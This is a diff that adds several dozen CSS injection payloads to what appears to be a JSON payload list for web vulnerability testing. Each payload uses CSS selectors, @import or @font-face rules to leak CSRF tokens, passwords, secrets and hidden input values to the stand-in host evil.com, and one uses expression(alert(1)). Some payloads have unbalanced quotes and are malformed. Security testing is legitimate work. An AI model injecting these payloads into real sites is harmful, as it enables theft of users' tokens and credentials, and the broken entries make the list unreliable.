@@ -251,5 +251,478 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-74124",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "input[name=\"csrf\"]{background:url(http://evil.com/leak+261)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74125",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "input[name=\"csrf\"]{background:url(//evil.com/css?259)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74126",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "input[name=\"token\"]{background:url(http://evil.com/leak+84)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74127",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "input[name=\"token\"]{background:url(//evil.com/css?27)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74128",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "input[name=\"password\"]{background:url(http://evil.com/leak+943)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74129",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "input[name=\"password\"]{background:url(//evil.com/css?784)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74130",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "input[name=\"secret\"]{background:url(http://evil.com/leak+164)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74131",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "input[name=\"secret\"]{background:url(//evil.com/css?845)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74132",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "input[type=\"hidden\"]{background:url(http://evil.com/leak+837)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74133",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "input[type=\"hidden\"]{background:url(//evil.com/css?840)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74134",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "#csrf{background:url(http://evil.com/leak+480)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74135",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "#csrf{background:url(//evil.com/css?656)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74136",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "#token{background:url(http://evil.com/leak+662)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74137",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "#token{background:url(//evil.com/css?824)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74138",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "#password{background:url(http://evil.com/leak+894)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74139",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "#password{background:url(//evil.com/css?640)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74140",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "#secret{background:url(http://evil.com/leak+130)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74141",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "#secret{background:url(//evil.com/css?430)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74142",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": ".csrf{background:url(http://evil.com/leak+193)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74143",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": ".csrf{background:url(//evil.com/css?191)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74144",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": ".token{background:url(http://evil.com/leak+139)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74145",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": ".token{background:url(//evil.com/css?27)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74146",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": ".password{background:url(http://evil.com/leak+453)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74147",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": ".password{background:url(//evil.com/css?483)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74148",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "[value^=\"a\"]{background:url(http://evil.com/leak+619)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74149",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "[value^=\"a\"]{background:url(//evil.com/css?326)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74150",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "[value^=\"b\"]{background:url(http://evil.com/leak+772)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74151",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "[value^=\"b\"]{background:url(//evil.com/css?535)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74152",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "[value^=\"c\"]{background:url(http://evil.com/leak+947)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74153",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "[value^=\"c\"]{background:url(//evil.com/css?531)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74154",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "[value^=\"d]{background:url(http://evil.com/leak+950)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74155",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "[value^=\"d]{background:url(//evil.com/css?641)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74156",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "[value^=\"e{background:url(http://evil.com/leak+430)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74157",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "[value^=\"e{background:url(//evil.com/css?659)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74158",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@font-face{src:url(http://evil.com/font.woff);font-family:test}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74159",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@import url(http://evil.com/font.woff)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74160",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@font-face{src:url(//evil.com/font.woff);font-family:test}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74161",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@import url(//evil.com/font.woff)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74162",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@font-face{src:url(https://evil.com/font.ttf);font-family:test}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74163",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@import url(https://evil.com/font.ttf)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74164",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@import url(//evil.com/css/leak)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74165",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "body{background-image:url(\"http://evil.com/track\")}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
+  },
+  {
+    "payload_id": "OWP-74166",
+    "vulnerability_category": "Injection (CSS Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "*{color:expression(alert(1))}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "url|import|background"
+    }
   }
 ]
